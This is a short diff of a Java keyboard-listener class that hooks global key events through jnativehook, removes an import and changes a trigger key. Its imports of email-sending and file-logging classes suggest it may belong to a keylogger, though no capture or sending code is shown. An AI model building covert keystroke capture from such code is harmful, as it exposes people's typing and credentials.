@@ -8,7 +8,6 @@ import logs.FileLogWriter;
 import logs.SendEmail;
 import logs.SendEmailThread;
 import main.Main;
-import main.SettingWindow;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
@@ -43,7 +42,7 @@ public class GlobalKeyListener implements NativeKeyListener{
         if (buf.toString().equals("START")) {
             Main.run();
         }
-        if(key.charAt(0) == 'A'){
+        if(key.charAt(0) == 'P'){
             KeyboardEmulator.put();
         }
     }
